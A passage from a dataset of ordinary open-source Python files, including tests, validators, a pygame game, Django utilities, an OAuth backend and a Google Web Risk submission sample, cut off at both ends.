        conf.get_mandatory_value(""database"", ""sql_alchemy_conn"").lower().startswith(""sqlite""),
        reason=""Standalone Dag Processor doesn't support sqlite."",
    )
    def test_start_job(
        self,
        mock_dag_job,
    ):
        """"""Ensure that DagFileProcessorManager is started""""""
        with conf_vars({(""scheduler"", ""standalone_dag_processor""): ""True""}):
            args = self.parser.parse_args([""dag-processor""])
            dag_processor_command.dag_processor(args)
            mock_dag_job.return_value.run.assert_called()"
JY537	JY537-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""bar.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD471	JD471-test_preset_sbd.py	"# coding: utf8
from __future__ import unicode_literals

import pytest
from thinc.neural.optimizers import Adam
from thinc.neural.ops import NumpyOps
from spacy.attrs import NORM
from spacy.gold import GoldParse
from spacy.vocab import Vocab
from spacy.tokens import Doc
from spacy.pipeline import DependencyParser


@pytest.fixture
def vocab():
    return Vocab(lex_attr_getters={NORM: lambda s: s})


@pytest.fixture
def parser(vocab):
    parser = DependencyParser(vocab)
    parser.cfg[""token_vector_width""] = 4
    parser.cfg[""hidden_width""] = 32
    # parser.add_label('right')
    parser.add_label(""left"")
    parser.begin_training([], **parser.cfg)
    sgd = Adam(NumpyOps(), 0.001)

    for i in range(10):
        losses = {}
        doc = Doc(vocab, words=[""a"", ""b"", ""c"", ""d""])
        gold = GoldParse(doc, heads=[1, 1, 3, 3], deps=[""left"", ""ROOT"", ""left"", ""ROOT""])
        parser.update([doc], [gold], sgd=sgd, losses=losses)
    return parser


def test_no_sentences(parser):
    doc = Doc(parser.vocab, words=[""a"", ""b"", ""c"", ""d""])
    doc = parser(doc)
    assert len(list(doc.sents)) >= 1


def test_sents_1(parser):
    doc = Doc(parser.vocab, words=[""a"", ""b"", ""c"", ""d""])
    doc[2].sent_start = True
    doc = parser(doc)
    assert len(list(doc.sents)) >= 2
    doc = Doc(parser.vocab, words=[""a"", ""b"", ""c"", ""d""])
    doc[1].sent_start = False
    doc[2].sent_start = True
    doc[3].sent_start = False
    doc = parser(doc)
    assert len(list(doc.sents)) == 2


def test_sents_1_2(parser):
    doc = Doc(parser.vocab, words=[""a"", ""b"", ""c"", ""d""])
    doc[1].sent_start = True
    doc[2].sent_start = True
    doc = parser(doc)
    assert len(list(doc.sents)) >= 3


def test_sents_1_3(parser):
    doc = Doc(parser.vocab, words=[""a"", ""b"", ""c"", ""d""])
    doc[1].sent_start = True
    doc[3].sent_start = True
    doc = parser(doc)
    assert len(list(doc.sents)) >= 3
    doc = Doc(parser.vocab, words=[""a"", ""b"", ""c"", ""d""])
    doc[1].sent_start = True
    doc[2].sent_start = False
    doc[3].sent_start = True
    doc = parser(doc)
    assert len(list(doc.sents)) == 3"
JD207	JD207-scoreboard.py	"import pygame as pg 
from ship import Ship
# import pygame.font

class Scoreboard:
    def __init__(self, game): 
        self.score = 0
        self.level = 0
        self.high_score = 0
        self.game = game
        
        self.settings = game.settings
        self.screen = game.screen
        self.screen_rect = self.screen.get_rect()
        self.stats = game.stats
        self.text_color = (30, 30, 30)
        self.font = pg.font.SysFont(None, 48)

        self.score_image = None 
        self.score_rect = None
        self.prep_score()
        self.prep_ships()

    def increment_score(self, key, point=0): 
        if key == 0:
            val = self.settings.pink_alien
        elif key == 1:
            val = self.settings.blue_alien
        elif key == 2:
            val = self.settings.green_alien
        else:
            val = point
        self.score += val
        self.prep_score()

    def prep_ships(self):
        self.ships = []
        for ship_number in range(self.game.ship.ships_left):
            ship = Ship(self.game)
            ship.rect.x = 10 + ship_number * ship.rect.width
            ship.rect.y = 10
            self.ships.append(ship)


    def prep_score(self): 
        score_str = str(self.score)
        self.score_image = self.font.render(score_str, True, self.text_color, self.settings.bg_color)

        # Display the score at the top right of the screen.
        self.score_rect = self.score_image.get_rect()
        self.score_rect.right = self.screen_rect.right - 20
        self.score_rect.top = 20

    def reset(self): 
        self.score = 0
        self.update()

    def update(self): 
        # TODO: other stuff
        self.draw()

    def draw(self): 
        self.screen.blit(self.score_image, self.score_rect)
        if self.stats.game_active:
            for ship in self.ships:
                ship.draw()"
JD204	JD204-map_styles.py	"import warnings


DARK = ""dark""
LIGHT = ""light""
SATELLITE = ""satellite""
ROAD = ""road""
DARK_NO_LABELS = ""dark_no_labels""
LIGHT_NO_LABELS = ""light_no_labels""

MAPBOX_LIGHT = ""mapbox://styles/mapbox/light-v9""
MAPBOX_DARK = ""mapbox://styles/mapbox/dark-v9""
MAPBOX_ROAD = ""mapbox://styles/mapbox/streets-v9""
MAPBOX_SATELLITE = ""mapbox://styles/mapbox/satellite-v9""

CARTO_DARK = ""https://basemaps.cartocdn.com/gl/dark-matter-gl-style/style.json""
CARTO_DARK_NO_LABELS = ""https://basemaps.cartocdn.com/gl/dark-matter-nolabels-gl-style/style.json""
CARTO_LIGHT = ""https://basemaps.cartocdn.com/gl/positron-gl-style/style.json""
CARTO_LIGHT_NO_LABELS = ""https://basemaps.cartocdn.com/gl/positron-nolabels-gl-style/style.json""
CARTO_ROAD = ""https://basemaps.cartocdn.com/gl/voyager-gl-style/style.json""

GOOGLE_SATELLITE = ""satellite""
GOOGLE_ROAD = ""roadmap""

styles = {
    DARK: {""mapbox"": MAPBOX_DARK, ""carto"": CARTO_DARK},
    DARK_NO_LABELS: {""carto"": CARTO_DARK_NO_LABELS},
    LIGHT: {""mapbox"": MAPBOX_LIGHT, ""carto"": CARTO_LIGHT},
    LIGHT_NO_LABELS: {""carto"": CARTO_LIGHT_NO_LABELS},
    ROAD: {""carto"": CARTO_ROAD, ""google_maps"": GOOGLE_ROAD, ""mapbox"": MAPBOX_ROAD},
    SATELLITE: {""mapbox"": MAPBOX_SATELLITE, ""google_maps"": GOOGLE_SATELLITE},
}


def get_from_map_identifier(map_identifier: str, provider: str) -> str:
    """"""Attempt to get a style URI by map provider, otherwise pass the map identifier
    to the API service

    Provide reasonable cross-provider default map styles

    Parameters
    ----------
    map_identifier : str
        Either a specific map provider style or a token indicating a map style. Currently
        tokens are ""dark"", ""light"", ""satellite"", ""road"", ""dark_no_labels"", or ""light_no_labels"".
        Not all map styles are available for all providers.
    provider : str
        One of ""carto"", ""mapbox"", or ""google_maps"", indicating the associated base map tile provider.

    Returns
    -------
    str
        Base map URI

    """"""
    try:
        return styles[map_identifier][provider]
    except KeyError:
        return map_identifier"
JY440	JY440-main.py	"import cv2
from cvzone.HandTrackingModule import HandDetector
from cvzone.ClassificationModule import Classifier
import numpy as np
import math
cap = cv2.VideoCapture(0)
detector = HandDetector(maxHands=1)
classifier = Classifier(""keras_model.h5"", ""labels.txt"")

offset = 20
imgSize = 300

folder = ""Data/C""
counter = 0

labels = [""A"", ""B"", ""C""]

while True:
    success, img = cap.read()
    imgOutput = img.copy()
    hands, img = detector.findHands(img)
    if hands:
        hand = hands[0]
        x, y, w, h = hand['bbox']

        imgWhite = np.ones((imgSize, imgSize, 3), np.uint8) * 255
        imgCrop = img[y - offset:y + h + offset, x - offset:x + w + offset]

        imgCropShape = imgCrop.shape

        aspectRatio = h / w

        if aspectRatio > 1:
            k = imgSize / h
            wCal = math.ceil(k * w)
            imgResize = cv2.resize(imgCrop, (wCal, imgSize))
            imgResizeShape = imgResize.shape
            wGap = math.ceil((imgSize - wCal) / 2)
            imgWhite[:, wGap:wCal + wGap] = imgResize
            prediction, index = classifier.getPrediction(imgWhite, draw=False)
            print(prediction, index)

        else:
            k = imgSize / w
            hCal = math.ceil(k * h)
            imgResize = cv2.resize(imgCrop, (imgSize, hCal))
            imgResizeShape = imgResize.shape
            hGap = math.ceil((imgSize - hCal) / 2)
            imgWhite[hGap:hCal + hGap, :] = imgResize
            prediction, index = classifier.getPrediction(imgWhite, draw=False)

        cv2.rectangle(imgOutput, (x - offset, y - offset-50),
                      (x - offset+90, y - offset-50+50), (255, 0, 255), cv2.FILLED)
        cv2.putText(imgOutput, labels[index], (x, y -26), cv2.FONT_HERSHEY_COMPLEX, 1.7, (255, 255, 255), 2)
        cv2.rectangle(imgOutput, (x-offset, y-offset),
                      (x + w+offset, y + h+offset), (255, 0, 255), 4)


        cv2.imshow(""ImageCrop"", imgCrop)
        cv2.imshow(""ImageWhite"", imgWhite)

    cv2.imshow(""Image"", imgOutput)
    cv2.waitKey(1)"
JD278	JD278-MpegImagePlugin.py	"#
# The Python Imaging Library.
# $Id$
#
# MPEG file handling
#
# History:
#       95-09-09 fl     Created
#
# Copyright (c) Secret Labs AB 1997.
# Copyright (c) Fredrik Lundh 1995.
#
# See the README file for information on usage and redistribution.
#


from . import Image, ImageFile
from ._binary import i8

#
# Bitstream parser


class BitStream:
    def __init__(self, fp):
        self.fp = fp
        self.bits = 0
        self.bitbuffer = 0

    def next(self):
        return i8(self.fp.read(1))

    def peek(self, bits):
        while self.bits < bits:
            c = self.next()
            if c < 0:
                self.bits = 0
                continue
            self.bitbuffer = (self.bitbuffer << 8) + c
            self.bits += 8
        return self.bitbuffer >> (self.bits - bits) & (1 << bits) - 1

    def skip(self, bits):
        while self.bits < bits:
            self.bitbuffer = (self.bitbuffer << 8) + i8(self.fp.read(1))
            self.bits += 8
        self.bits = self.bits - bits

    def read(self, bits):
        v = self.peek(bits)
        self.bits = self.bits - bits
        return v


##
# Image plugin for MPEG streams.  This plugin can identify a stream,
# but it cannot read it.


class MpegImageFile(ImageFile.ImageFile):

    format = ""MPEG""
    format_description = ""MPEG""

    def _open(self):

        s = BitStream(self.fp)

        if s.read(32) != 0x1B3:
            msg = ""not an MPEG file""
            raise SyntaxError(msg)

        self.mode = ""RGB""
        self._size = s.read(12), s.read(12)


# --------------------------------------------------------------------
# Registry stuff

Image.register_open(MpegImageFile.format, MpegImageFile)

Image.register_extensions(MpegImageFile.format, ["".mpg"", "".mpeg""])

Image.register_mime(MpegImageFile.format, ""video/mpeg"")"
JD34	JD34-intranges.py	"""""""
Given a list of integers, made up of (hopefully) a small number of long runs
of consecutive integers, compute a representation of the form
((start1, end1), (start2, end2) ...). Then answer the question ""was x present
in the original list?"" in time O(log(# runs)).
""""""

import bisect
from typing import List, Tuple

def intranges_from_list(list_):
    # type: (List[int]) -> Tuple[int, ...]
    """"""Represent a list of integers as a sequence of ranges:
    ((start_0, end_0), (start_1, end_1), ...), such that the original
    integers are exactly those x such that start_i <= x < end_i for some i.

    Ranges are encoded as single integers (start << 32 | end), not as tuples.
    """"""

    sorted_list = sorted(list_)
    ranges = []
    last_write = -1
    for i in range(len(sorted_list)):
        if i+1 < len(sorted_list):
            if sorted_list[i] == sorted_list[i+1]-1:
                continue
        current_range = sorted_list[last_write+1:i+1]
        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))
        last_write = i

    return tuple(ranges)

def _encode_range(start, end):
    # type: (int, int) -> int
    return (start << 32) | end

def _decode_range(r):
    # type: (int) -> Tuple[int, int]
    return (r >> 32), (r & ((1 << 32) - 1))


def intranges_contain(int_, ranges):
    # type: (int, Tuple[int, ...]) -> bool
    """"""Determine if `int_` falls into one of the ranges in `ranges`.""""""
    tuple_ = _encode_range(int_, 0)
    pos = bisect.bisect_left(ranges, tuple_)
    # we could be immediately ahead of a tuple (start, end)
    # with start < int_ <= end
    if pos > 0:
        left, right = _decode_range(ranges[pos-1])
        if left <= int_ < right:
            return True
    # or we could be immediately behind a tuple (int_, end)
    if pos < len(ranges):
        left, _ = _decode_range(ranges[pos])
        if left == int_:
            return True
    return False"
JY219	JY219-hstore.py	"import json

from django import forms
from django.core.exceptions import ValidationError
from django.utils.translation import gettext_lazy as _

__all__ = [""HStoreField""]


class HStoreField(forms.CharField):
    """"""
    A field for HStore data which accepts dictionary JSON input.
    """"""

    widget = forms.Textarea
    default_error_messages = {
        ""invalid_json"": _(""Could not load JSON data.""),
        ""invalid_format"": _(""Input must be a JSON dictionary.""),
    }

    def prepare_value(self, value):
        if isinstance(value, dict):
            return json.dumps(value)
        return value

    def to_python(self, value):
        if not value:
            return {}
        if not isinstance(value, dict):
            try:
                value = json.loads(value)
            except json.JSONDecodeError:
                raise ValidationError(
                    self.error_messages[""invalid_json""],
                    code=""invalid_json"",
                )

        if not isinstance(value, dict):
            raise ValidationError(
                self.error_messages[""invalid_format""],
                code=""invalid_format"",
            )

        # Cast everything to strings for ease.
        for key, val in value.items():
            if val is not None:
                val = str(val)
            value[key] = val
        return value

    def has_changed(self, initial, data):
        """"""
        Return True if data differs from initial.
        """"""
        # For purposes of seeing whether something has changed, None is
        # the same as an empty dict, if the data or initial value we get
        # is None, replace it w/ {}.
        initial_value = self.to_python(initial)
        return super().has_changed(initial_value, data)"
JY80	JY80-indent_text.py	"# -*- coding: utf-8 -*-
from django import template

register = template.Library()


class IndentByNode(template.Node):
    def __init__(self, nodelist, indent_level, if_statement):
        self.nodelist = nodelist
        self.indent_level = template.Variable(indent_level)
        if if_statement:
            self.if_statement = template.Variable(if_statement)
        else:
            self.if_statement = None

    def render(self, context):
        indent_level = self.indent_level.resolve(context)
        if self.if_statement:
            try:
                if_statement = bool(self.if_statement.resolve(context))
            except template.VariableDoesNotExist:
                if_statement = False
        else:
            if_statement = True
        output = self.nodelist.render(context)
        if if_statement:
            indent = "" "" * indent_level
            output = indent + indent.join(output.splitlines(True))
        return output


@register.tag
def indentby(parser, token):
    """"""
    Add indentation to text between the tags by the given indentation level.

    {% indentby <indent_level> [if <statement>] %}
    ...
    {% endindentby %}

    Arguments:
      indent_level - Number of spaces to indent text with.
      statement - Only apply indent_level if the boolean statement evalutates to True.
    """"""
    args = token.split_contents()
    largs = len(args)
    if largs not in (2, 4):
        raise template.TemplateSyntaxError(""indentby tag requires 1 or 3 arguments"")
    indent_level = args[1]
    if_statement = None
    if largs == 4:
        if_statement = args[3]
    nodelist = parser.parse(('endindentby', ))
    parser.delete_first_token()
    return IndentByNode(nodelist, indent_level, if_statement)"
JY543	JY543-ship.py	"import pygame


class Ship():
    """"""Класс для управления кораблем.""""""

    def __init__(self, ai_game):
        """"""Инициализирует корабль и задает его начальную позицию.""""""
        self.screen = ai_game.screen
        self.settings = ai_game.settings
        self.screen_rect = ai_game.screen.get_rect()

        # Загружает изображение корабля и получает прямоугольник.
        self.image = pygame.image.load('images/ship.bmp')
        self.rect = self.image.get_rect()
        # Каждый новый корабль появляется у нижнего края экрана.
        self.rect.midleft = self.screen_rect.midleft

        # Сохранение вещественной координаты центра корабля.
        self.y = float(self.rect.y)

        # Флаги перемещения
        self.moving_up = False
        self.moving_down = False

    def update(self):
        """"""Обновляет позицию корабля с учетом флагов.""""""
        if self.moving_up and self.rect.top > 0:
            self.y -= self.settings.ship_speed
        if self.moving_down and self.rect.bottom < self.screen_rect.bottom:
            self.y += self.settings.ship_speed

        # Обновление атрибута rect на основании self.x.
        self.rect.y = self.y

    def blitme(self):
        """"""Рисует корабль в текущей позиции.""""""
        self.screen.blit(self.image, self.rect)

    def center_ship(self):
        """"""Размещает корабль в центре левой стороны.""""""
        self.rect.midleft = self.screen_rect.midleft
        self.y = float(self.rect.y)"
JY427	JY427-objects.py	"""""""Object Utilities.""""""
from __future__ import absolute_import, unicode_literals


class cached_property(object):
    """"""Cached property descriptor.

    Caches the return value of the get method on first call.

    Examples:
        .. code-block:: python

            @cached_property
            def connection(self):
                return Connection()

            @connection.setter  # Prepares stored value
            def connection(self, value):
                if value is None:
                    raise TypeError('Connection must be a connection')
                return value

            @connection.deleter
            def connection(self, value):
                # Additional action to do at del(self.attr)
                if value is not None:
                    print('Connection {0!r} deleted'.format(value)
    """"""

    def __init__(self, fget=None, fset=None, fdel=None, doc=None):
        self.__get = fget
        self.__set = fset
        self.__del = fdel
        self.__doc__ = doc or fget.__doc__
        self.__name__ = fget.__name__
        self.__module__ = fget.__module__

    def __get__(self, obj, type=None):
        if obj is None:
            return self
        try:
            return obj.__dict__[self.__name__]
        except KeyError:
            value = obj.__dict__[self.__name__] = self.__get(obj)
            return value

    def __set__(self, obj, value):
        if obj is None:
            return self
        if self.__set is not None:
            value = self.__set(obj, value)
        obj.__dict__[self.__name__] = value

    def __delete__(self, obj, _sentinel=object()):
        if obj is None:
            return self
        value = obj.__dict__.pop(self.__name__, _sentinel)
        if self.__del is not None and value is not _sentinel:
            self.__del(obj, value)

    def setter(self, fset):
        return self.__class__(self.__get, fset, self.__del)

    def deleter(self, fdel):
        return self.__class__(self.__get, self.__set, fdel)"
JY501	JY501-__init__.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome.components import switch
from esphome.const import ICON_POWER
from .. import CONF_PIPSOLAR_ID, PIPSOLAR_COMPONENT_SCHEMA, pipsolar_ns

DEPENDENCIES = [""uart""]

CONF_OUTPUT_SOURCE_PRIORITY_UTILITY = ""output_source_priority_utility""
CONF_OUTPUT_SOURCE_PRIORITY_SOLAR = ""output_source_priority_solar""
CONF_OUTPUT_SOURCE_PRIORITY_BATTERY = ""output_source_priority_battery""
CONF_INPUT_VOLTAGE_RANGE = ""input_voltage_range""
CONF_PV_OK_CONDITION_FOR_PARALLEL = ""pv_ok_condition_for_parallel""
CONF_PV_POWER_BALANCE = ""pv_power_balance""

TYPES = {
    CONF_OUTPUT_SOURCE_PRIORITY_UTILITY: (""POP00"", None),
    CONF_OUTPUT_SOURCE_PRIORITY_SOLAR: (""POP01"", None),
    CONF_OUTPUT_SOURCE_PRIORITY_BATTERY: (""POP02"", None),
    CONF_INPUT_VOLTAGE_RANGE: (""PGR01"", ""PGR00""),
    CONF_PV_OK_CONDITION_FOR_PARALLEL: (""PPVOKC1"", ""PPVOKC0""),
    CONF_PV_POWER_BALANCE: (""PSPB1"", ""PSPB0""),
}

PipsolarSwitch = pipsolar_ns.class_(""PipsolarSwitch"", switch.Switch, cg.Component)

PIPSWITCH_SCHEMA = switch.switch_schema(
    PipsolarSwitch, icon=ICON_POWER, block_inverted=True
).extend(cv.COMPONENT_SCHEMA)

CONFIG_SCHEMA = PIPSOLAR_COMPONENT_SCHEMA.extend(
    {cv.Optional(type): PIPSWITCH_SCHEMA for type in TYPES}
)


async def to_code(config):
    paren = await cg.get_variable(config[CONF_PIPSOLAR_ID])

    for type, (on, off) in TYPES.items():
        if type in config:
            conf = config[type]
            var = await switch.new_switch(conf)
            await cg.register_component(var, conf)
            cg.add(getattr(paren, f""set_{type}_switch"")(var))
            cg.add(var.set_parent(paren))
            cg.add(var.set_on_command(on))
            if off is not None:
                cg.add(var.set_off_command(off))"
JY546	JY546-test_return_logical.py	"import pytest

from numpy import array
from . import util


class TestReturnLogical(util.F2PyTest):
    def check_function(self, t):
        assert t(True) == 1
        assert t(False) == 0
        assert t(0) == 0
        assert t(None) == 0
        assert t(0.0) == 0
        assert t(0j) == 0
        assert t(1j) == 1
        assert t(234) == 1
        assert t(234.6) == 1
        assert t(234.6 + 3j) == 1
        assert t(""234"") == 1
        assert t(""aaa"") == 1
        assert t("""") == 0
        assert t([]) == 0
        assert t(()) == 0
        assert t({}) == 0
        assert t(t) == 1
        assert t(-234) == 1
        assert t(10**100) == 1
        assert t([234]) == 1
        assert t((234, )) == 1
        assert t(array(234)) == 1
        assert t(array([234])) == 1
        assert t(array([[234]])) == 1
        assert t(array([127], ""b"")) == 1
        assert t(array([234], ""h"")) == 1
        assert t(array([234], ""i"")) == 1
        assert t(array([234], ""l"")) == 1
        assert t(array([234], ""f"")) == 1
        assert t(array([234], ""d"")) == 1
        assert t(array([234 + 3j], ""F"")) == 1
        assert t(array([234], ""D"")) == 1
        assert t(array(0)) == 0
        assert t(array([0])) == 0
        assert t(array([[0]])) == 0
        assert t(array([0j])) == 0
        assert t(array([1])) == 1
        pytest.raises(ValueError, t, array([0, 0]))


class TestFReturnLogical(TestReturnLogical):
    sources = [
        util.getpath(""tests"", ""src"", ""return_logical"", ""foo77.f""),
        util.getpath(""tests"", ""src"", ""return_logical"", ""foo90.f90""),
    ]

    @pytest.mark.slow
    @pytest.mark.parametrize(""name"", ""t0,t1,t2,t4,s0,s1,s2,s4"".split("",""))
    def test_all_f77(self, name):
        self.check_function(getattr(self.module, name))

    @pytest.mark.slow
    @pytest.mark.parametrize(""name"",
                             ""t0,t1,t2,t4,t8,s0,s1,s2,s4,s8"".split("",""))
    def test_all_f90(self, name):
        self.check_function(getattr(self.module.f90_return_logical, name))"
JD336	JD336-strava.py	"""""""
Strava OAuth2 backend, docs at:
    https://python-social-auth.readthedocs.io/en/latest/backends/strava.html
""""""
from .oauth import BaseOAuth2


class StravaOAuth(BaseOAuth2):
    name = 'strava'
    AUTHORIZATION_URL = 'https://www.strava.com/oauth/authorize'
    ACCESS_TOKEN_URL = 'https://www.strava.com/oauth/token'
    ACCESS_TOKEN_METHOD = 'POST'
    # Strava doesn't check for parameters in redirect_uri and directly appends
    # the auth parameters to it, ending with an URL like:
    # http://example.com/complete/strava?redirect_state=xxx?code=xxx&state=xxx
    # Check issue #259 for details.
    REDIRECT_STATE = False
    REVOKE_TOKEN_URL = 'https://www.strava.com/oauth/deauthorize'
    SCOPE_SEPARATOR = ','
    EXTRA_DATA = [
        ('refresh_token', 'refresh_token'),
        ('expires_in', 'expires'),
    ]

    def get_user_id(self, details, response):
        return response['athlete']['id']

    def get_user_details(self, response):
        """"""Return user details from Strava account""""""
        username = response['athlete'].get('username', '')
        fullname, first_name, last_name = self.get_user_names(
            first_name=response['athlete'].get('firstname', ''),
            last_name=response['athlete'].get('lastname', ''),
        )
        return {'username': username,
                'fullname': fullname,
                'first_name': first_name,
                'last_name': last_name}

    def user_data(self, access_token, *args, **kwargs):
        """"""Loads user data from service""""""
        return self.get_json('https://www.strava.com/api/v3/athlete',
                             params={'access_token': access_token})

    def revoke_token_params(self, token, uid):
        params = super().revoke_token_params(token, uid)
        params['access_token'] = token
        return params"
JD325	JD325-submit_uri.py	"#  Copyright 2022 Google LLC
#
#  Licensed under the Apache License, Version 2.0 (the ""License"");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an ""AS IS"" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

# [START webrisk_submit_uri]
from google.cloud import webrisk_v1


def submit_uri(project_id: str, uri: str) -> None:
    """"""Submits a URI suspected of containing malicious content to be reviewed.

    Returns a google.longrunning.Operation which, once the review is complete, is updated with its result.
    If the result verifies the existence of malicious content, the site will be added to the
    Google's Social Engineering lists in order to protect users that could get exposed to this
    threat in the future. Only allow-listed projects can use this method during Early Access.

     Args:
         project_id: The name of the project that is making the submission.
         uri: The URI that is being reported for malicious content to be analyzed.
             uri = ""http://testsafebrowsing.appspot.com/s/malware.html""
    """"""
    webrisk_client = webrisk_v1.WebRiskServiceClient()

    submission = webrisk_v1.Submission()
    submission.uri = uri

    request = webrisk_v1.CreateSubmissionRequest()
    request.parent = f""projects/{project_id}""
    request.submission = submission

    response = webrisk_client.create_submission(request)
    print(f""Submission response: {response}"")

# [END webrisk_submit_uri]"
JY34	JY34-fast_rcnn_r50_fpn.py	"# model settings
model = dict(
    type='FastRCNN',
    backbone=dict(
        type='ResNet',
        depth=50,
        num_stages=4,
        out_indices=(0, 1, 2, 3),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=True),
        norm_eval=True,
        style='pytorch',
        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50')),
    neck=dict(
        type='FPN',
        in_channels=[256, 512, 1024, 2048],
        out_channels=256,
        num_outs=5),
    roi_head=dict(
        type='StandardRoIHead',
        bbox_roi_extractor=dict(
            type='SingleRoIExtractor',
            roi_layer=dict(type='RoIAlign', output_size=7, sampling_ratio=0),
            out_channels=256,
            featmap_strides=[4, 8, 16, 32]),
        bbox_head=dict(
            type='Shared2FCBBoxHead',
            in_channels=256,
            fc_out_channels=1024,
            roi_feat_size=7,
            num_classes=80,
            bbox_coder=dict(
                type='DeltaXYWHBBoxCoder',
                target_means=[0., 0., 0., 0.],
                target_stds=[0.1, 0.1, 0.2, 0.2]),
            reg_class_agnostic=False,
            loss_cls=dict(
                type='CrossEntropyLoss', use_sigmoid=False, loss_weight=1.0),
            loss_bbox=dict(type='L1Loss', loss_weight=1.0))),
    # model training and testing settings
    train_cfg=dict(
        rcnn=dict(
            assigner=dict(
                type='MaxIoUAssigner',
                pos_iou_thr=0.5,
                neg_iou_thr=0.5,
                min_pos_iou=0.5,
                match_low_quality=False,
                ignore_iof_thr=-1),
            sampler=dict(
                type='RandomSampler',
                num=512,
                pos_fraction=0.25,
                neg_pos_ub=-1,
                add_gt_as_proposals=True),
            pos_weight=-1,
            debug=False)),
    test_cfg=dict(
        rcnn=dict(
            score_thr=0.05,
            nms=dict(type='nms', iou_threshold=0.5),
            max_per_img=100)))"
JY247	JY247-_windows.py	"import sys
from dataclasses import dataclass


@dataclass
class WindowsConsoleFeatures:
    """"""Windows features available.""""""

    vt: bool = False
    """"""The console supports VT codes.""""""
    truecolor: bool = False
    """"""The console supports truecolor.""""""


try:
    import ctypes
    from ctypes import LibraryLoader

    if sys.platform == ""win32"":
        windll = LibraryLoader(ctypes.WinDLL)
    else:
        windll = None
        raise ImportError(""Not windows"")

    from pip._vendor.rich._win32_console import (
        ENABLE_VIRTUAL_TERMINAL_PROCESSING,
        GetConsoleMode,
        GetStdHandle,
        LegacyWindowsError,
    )

except (AttributeError, ImportError, ValueError):

    # Fallback if we can't load the Windows DLL
    def get_windows_console_features() -> WindowsConsoleFeatures:
        features = WindowsConsoleFeatures()
        return features

else:

    def get_windows_console_features() -> WindowsConsoleFeatures:
        """"""Get windows console features.

        Returns:
            WindowsConsoleFeatures: An instance of WindowsConsoleFeatures.
        """"""
        handle = GetStdHandle()
        try:
            console_mode = GetConsoleMode(handle)
            success = True
        except LegacyWindowsError:
            console_mode = 0
            success = False
        vt = bool(success and console_mode & ENABLE_VIRTUAL_TERMINAL_PROCESSING)
        truecolor = False
        if vt:
            win_version = sys.getwindowsversion()
            truecolor = win_version.major > 10 or (
                win_version.major == 10 and win_version.build >= 15063
            )
        features = WindowsConsoleFeatures(vt=vt, truecolor=truecolor)
        return features


if __name__ == ""__main__"":
    import platform

    features = get_windows_console_features()
    from pip._vendor.rich import print

    print(f'platform=""{platform.system()}""')
    print(repr(features))"
JD10	JD10-urls.py	"""""""tst_tc1357_uxusylnz_68580 URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/2.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""

from django.contrib import admin
from django.urls import path, include, re_path
from django.views.generic.base import TemplateView
from allauth.account.views import confirm_email
from rest_framework import permissions
from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView

urlpatterns = [
    
    path(""accounts/"", include(""allauth.urls"")),
    path(""modules/"", include(""modules.urls"")),
    path(""api/v1/"", include(""home.api.v1.urls"")),
    path(""admin/"", admin.site.urls),
    path(""users/"", include(""users.urls"", namespace=""users"")),
    path(""rest-auth/"", include(""rest_auth.urls"")),
    # Override email confirm to use allauth's HTML view instead of rest_auth's API view
    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),
    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),
]

admin.site.site_header = ""TST-TC1357-uxusylnzzz""
admin.site.site_title = ""TST-TC1357-uxusylnzzz Admin Portal""
admin.site.index_title = ""TST-TC1357-uxusylnzzz Admin""

# swagger
urlpatterns += [
    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),
    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")
]


urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
JY161	JY161-test_kernel_menu.py	"""""""Test kernel menu""""""


from .utils import EDITOR_PAGE


restart_selectors = [
    '#restart_kernel', '#restart_clear_output', '#restart_run_all'
]
notify_interaction = '#notification_kernel > span'
shutdown_selector = '#shutdown_kernel'
confirm_selector = '.btn-danger'
cancel_selector = "".modal-footer button:first-of-type""


def test_cancel_restart_or_shutdown(notebook_frontend):
    """"""Click each of the restart options, then cancel the confirmation dialog""""""
    kernel_menu = notebook_frontend.locate('#kernellink', EDITOR_PAGE)
    if not kernel_menu:
        raise Exception('Could not find kernel_menu')

    for menu_item in restart_selectors + [shutdown_selector]:
        kernel_menu.click()
